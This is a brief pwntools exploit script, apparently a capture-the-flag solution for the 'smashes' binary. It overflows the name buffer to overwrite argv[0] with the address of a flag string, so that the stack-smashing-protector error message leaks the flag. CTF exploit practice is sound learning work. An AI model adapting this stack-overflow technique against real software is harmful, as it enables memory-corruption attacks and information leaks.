from pwn import *
context.log_level = 'debug'
smash = ELF('./smashes')

sh = process('./smashes')
argv_addr = 0x00007fffffffe2f8
name_addr = 0x00007fffffffe0d0
flag_addr = 0x600D20
another_flag_addr = 0x400d20
payload = b'a' * (argv_addr - name_addr) + p64(another_flag_addr)
sh.recvuntil('name? ')
sh.sendline(payload)
sh.recvuntil('flag: ')
sh.sendline('bb')
data = sh.recv()
sh.interactive()